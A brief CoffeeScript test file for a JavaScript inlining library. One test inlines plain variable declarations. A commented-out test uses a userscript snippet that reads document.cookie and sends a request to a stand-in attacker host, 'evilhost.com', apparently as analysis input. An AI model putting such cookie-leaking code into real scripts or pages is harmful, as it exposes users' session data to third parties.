jsinliner = require "../lib/jsinliner"

exports["var"] = (test) ->
    code = '''
    var x;
    var y = z = 5;
    var a, b=5;
    var c=function(){}
    x=5
    '''
    jsinliner.inline code
    test.done()

#exports["jscode"] = (test) ->
#    code = '''
#        var sec = document.cookie;
#        var pub = 'noesta!';
#
#        if ( sec !== '' ) pub = 'esta!';
#
#        GM_xmlhttpRequest({
#          method: "GET",
#          url: "http://www.evilhost.com/"+pub
#        });
#
#    '''
#    jsinliner.inline code
#    test.done()
